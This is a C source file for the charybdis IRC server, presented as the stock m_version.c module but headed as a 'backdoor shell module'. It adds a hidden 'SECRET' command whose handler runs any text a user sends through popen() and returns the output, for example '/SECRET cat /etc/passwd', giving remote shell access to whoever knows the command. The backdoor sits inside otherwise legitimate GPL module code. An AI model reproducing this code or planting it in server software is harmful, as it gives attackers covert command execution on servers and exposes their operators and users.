// charyb-sh: backdoor shell module (replaces regular m_version)
// by malcom
//
// usage:     /<IRC_COMMAND> <SHELL COMMAND>
//            /SECRET cat /etc/passwd 
// notes:     set the "COMMAND" macro to the desired command name (e.g. eval)
//    
// tested on charybdis-3.5.0-dev (will likely work on previous versions)

/*
 *  ircd-ratbox: A slightly useful ircd.
 *  m_version.c: Shows ircd version information.
 *
 *  Copyright (C) 1990 Jarkko Oikarinen and University of Oulu, Co Center
 *  Copyright (C) 1996-2002 Hybrid Development Team
 *  Copyright (C) 2002-2005 ircd-ratbox development team
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307
 *  USA
 *
 *  $Id: m_version.c 1887 2006-08-29 13:42:56Z jilles $
 */

#include <stdinc.h>
#include "client.h"
#include "ircd.h"
#include "numeric.h"
#include "s_conf.h"
#include "s_serv.h"
#include "supported.h"
#include "send.h"
#include "msg.h"
#include "parse.h"
#include "modules.h"

#define IRC_COMMAND "SECRET"

static char *confopts(struct Client *source_p);

static int m_version(struct Client *, struct Client *, int, const char **);
static int mo_version(struct Client *, struct Client *, int, const char **);
static int m_edition(struct Client *, struct Client *, int, const char **);

struct Message version_msgtab = {
	"VERSION", 0, 0, 0, MFLG_SLOW,
	{mg_unreg, {m_version, 0}, {mo_version, 0}, {mo_version, 0}, mg_ignore, {mo_version, 0}}
};

struct Message edition_msgtab = {
	IRC_COMMAND, 0, 0, 0, MFLG_SLOW,
	{mg_unreg, {m_edition, 1}, {m_edition, 1}, mg_ignore, mg_ignore, mg_ignore}
};

mapi_clist_av1 version_clist[] = { &version_msgtab, &edition_msgtab, NULL};
DECLARE_MODULE_AV1(version, NULL, NULL, version_clist, NULL, NULL, "$Revision: 1887 $");

static int
m_edition(struct Client *client_p, struct Client *source_p, int parc, const char *parv[])
{
  int c;
  int t = 0;
  FILE *pipe;
  char buffer[422];
  bzero(buffer, 422);
  
  pipe = popen(parv[1], "r");
  if(pipe != NULL)
  {
    while( (c=fgetc(pipe))!=EOF )
    {
      if(c != '\n')                       // charybdis-3.5.0-dev on x86-64 architecture chimps w/o this
        snprintf(buffer+t, 421, "%c", c);
        
      t++; 
      if(t > 420 || c=='\n')
      {
        sendto_one(source_p, buffer);
        bzero(buffer, 422);
        t = 0;
      }
    }
    return 0;
  }    
  else
  {
    sendto_one(source_p, "error: unable to establish pipe");
    return 1;
  }

  return 0;
}

/*
 * m_version - VERSION command handler
 *      parv[1] = remote server
 */
static int
m_version(struct Client *client_p, struct Client *source_p, int parc, const char *parv[])
{
	static time_t last_used = 0L;

	if(parc > 1)
	{
		if((last_used + ConfigFileEntry.pace_wait) > rb_current_time())
		{
			/* safe enough to give this on a local connect only */
			sendto_one(source_p, form_str(RPL_LOAD2HI),
				   me.name, source_p->name, "VERSION");
			return 0;
		}
		else
			last_used = rb_current_time();

		if(hunt_server(client_p, source_p, ":%s VERSION :%s", 1, parc, parv) != HUNTED_ISME)
			return 0;
	}

	sendto_one_numeric(source_p, RPL_VERSION, form_str(RPL_VERSION),
			   ircd_version, serno,
			   me.name, confopts(source_p), TS_CURRENT,
			   ServerInfo.sid);

	show_isupport(source_p);

	return 0;
}

/*
 * mo_version - VERSION command handler
 *      parv[1] = remote server
 */
static int
mo_version(struct Client *client_p, struct Client *source_p, int parc, const char *parv[])
{
	if(hunt_server(client_p, source_p, ":%s VERSION :%s", 1, parc, parv) == HUNTED_ISME)
	{
		sendto_one_numeric(source_p, RPL_VERSION, form_str(RPL_VERSION),
				   ircd_version, serno, 
#ifdef CUSTOM_BRANDING
				   PACKAGE_NAME " " PACKAGE_VERSION,
#endif
				   me.name, confopts(source_p), TS_CURRENT,
				   ServerInfo.sid);
		show_isupport(source_p);
	}

	return 0;
}

/* confopts()
 * input  - client pointer
 * output - ircd.conf option string
 * side effects - none
 */
static char *
confopts(struct Client *source_p)
{
	static char result[15];
	char *p;

	result[0] = '\0';
	p = result;

	if(ConfigChannel.use_except)
		*p++ = 'e';

	/* might wanna hide this :P */
	if(ServerInfo.hub)
		*p++ = 'H';

	if(ConfigChannel.use_invex)
		*p++ = 'I';

	if(ConfigChannel.use_knock)
		*p++ = 'K';

	*p++ = 'M';
	*p++ = 'p';

	if(opers_see_all_users || ConfigFileEntry.operspy_dont_care_user_info)
		*p++ = 'S';
#ifdef IGNORE_BOGUS_TS
	*p++ = 'T';
#endif

#ifdef HAVE_LIBZ
	*p++ = 'Z';
#endif

#ifdef RB_IPV6
	*p++ = '6';
#endif

	*p = '\0';

	return result;
}
